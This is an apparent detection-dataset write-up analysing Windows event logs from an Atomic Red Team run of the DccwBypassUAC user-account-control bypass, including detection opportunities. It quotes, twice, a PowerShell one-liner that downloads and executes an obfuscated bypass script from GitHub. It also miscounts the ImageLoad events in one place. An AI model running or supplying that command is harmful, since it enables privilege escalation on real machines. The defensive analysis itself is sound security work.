# T1548.002-21: Bypass User Account Control — WinPwn UAC Bypass DccwBypassUAC Technique

## Technique Context

This test uses WinPwn's `DccwBypassUAC` technique. `dccw.exe` (Device Color Calibration
Wizard) is an auto-elevating Windows binary. The DccwBypassUAC technique exploits `dccw.exe`'s
COM object registration lookups to hijack execution — similar to the fodhelper/eventvwr
approaches but targeting `dccw.exe` specifically. The script is fetched from a different
GitHub repository than the WinPwn tests (18–20):
`iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')`

This is an obfuscated PowerShell payload (`dccuac.ps1`) from S3cur3Th1sSh1t's `Creds`
repository — distinct from the WinPwn.ps1 module used in tests 18–20. Note that the ART
test framework wraps this as a WinPwn call internally, but the downloaded script is different.

## What This Dataset Contains

**Sysmon (40 events):** EIDs 7 (ImageLoad, 25), 1 (ProcessCreate, 4), 10 (ProcessAccess, 4),
17 (PipeCreate, 3), 11 (FileCreate, 2), 22 (DnsQuery, 1), 3 (NetworkConnect, 1).

Key process-create events (EID 1):
- `whoami.exe` — ART pre-check
- Child `powershell.exe` with the dccuac.ps1 download command:
  `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')}`
  `SHA256=3247BCFD60F6DD25F34CB74B5889AB10EF1B3EC72B4D4B3D95B5B25B534560B8`
  (parent: ART test framework `powershell.exe`)
- `whoami.exe` — ART post-check (parent: ART test framework `powershell.exe`)
- A fourth `powershell.exe` with an empty command block: `"powershell.exe" & {}` (cleanup stub)

EID 3 (NetworkConnect, 1): `powershell.exe` → `185.199.109.133:443` — HTTPS connection for
script download (GitHub CDN, same IP range as WinPwn tests).

EID 11 (FileCreate, 2): `powershell.exe` writing the `StartupProfileData-NonInteractive`
profile file (ambient).

EID 17 (PipeCreate, 3): Three named pipes created across the ART test framework, dccuac, and cleanup
PowerShell processes — each new `powershell.exe` instance creates its `\PSHost.*` pipe.

**Security (4 events):** Four EID 4688 events: `whoami.exe` (pre-check), dccuac `powershell.exe`
with the download command, `whoami.exe` (post-check), cleanup `powershell.exe` with empty
command block `& {}`.

**PowerShell (121 events):** EIDs 4104 (116), 4103 (4), 4100 (1). This is the highest
PowerShell event count in the T1548.002 batch. The four EID 4103 events include
`Set-ExecutionPolicy -Bypass` (ART test framework) and `Write-Host "DONE"` —
(`CommandInvocation(Write-Host): "Write-Host"`, `name="Object"; value="DONE"`) — confirming
the dccuac.ps1 script executed to completion and reported success. The EID 4100 indicates
a PowerShell pipeline error in the cleanup phase.

## What This Dataset Does Not Contain

**No dccw.exe process create.** The DccwBypassUAC technique should cause `dccw.exe` to spawn
an elevated payload, but `dccw.exe` does not appear in any Sysmon EID 1 or Security EID 4688
event. The obfuscated dccuac.ps1 script may rely on a COM activation path that is not directly
observable in process creation telemetry.

**No obfuscated script-block content (decoded).** The 116 EID 4104 events capture the
script-block text as executed, including whatever deobfuscation happened in memory — however,
the dccuac.ps1 is described as "obfuscated" and the PowerShell engine logs the post-deobfuscation
form in EID 4104. The actual obfuscated source is not present as a separate artifact.

**No registry modifications.** DccwBypassUAC likely writes registry keys for COM handler
hijacking, but no Sysmon EID 12/13 or Security EID 4657 events related to the bypass
mechanism appear in the samples.

## Assessment

The `Write-Host "DONE"` EID 4103 event is the most significant finding in this dataset: it
confirms the dccuac.ps1 script ran to its final completion statement. This is stronger evidence
of technique execution than any of the pure-UACME tests (12–15), where the bypass binary ran
but no completion indicator was logged. At 121 PowerShell events (vs. 47 in the defended run),
the script-block content is fully captured. The four EID 7 ImageLoad events (25 total, more
than any other test in this batch) reflect the dccuac.ps1 script loading additional .NET
assemblies or reflection-based code compared to the WinPwn magic/DiskCleanup tests.

The URL differences between this test (`Creds/master/obfuscatedps/dccuac.ps1`) and the WinPwn
tests (pinned commit of `WinPwn.ps1`) are meaningful: `dccuac.ps1` is fetched from the
`master` branch (no commit pin), meaning the payload could differ across runs.

## Detection Opportunities Present in This Data

- **Security EID 4688 / Sysmon EID 1:** `powershell.exe` downloading `dccuac.ps1` from
  `raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/`.
- **PowerShell EID 4103:** `Write-Host` with `value="DONE"` following a download-and-execute
  pattern confirms successful script completion — a behavioral completeness indicator.
- **Sysmon EID 3:** `powershell.exe` outbound HTTPS to `185.199.109.133:443` from SYSTEM
  context is anomalous in most enterprise environments.
- **EID 4688 sequence:** `powershell.exe & {}` (empty command block) as a cleanup stub
  is a distinctive ART framework artifact, but the preceding `dccuac.ps1` download is the
  actionable indicator.
- **Process hash:** The dccuac `powershell.exe` child shares
  `SHA256=3247BCFD60F6DD25F34CB74B5889AB10EF1B3EC72B4D4B3D95B5B25B534560B8`
  with WinPwn tests 18, 19, 20 — consistent with all being the standard Windows PowerShell
  binary rather than a custom payload.
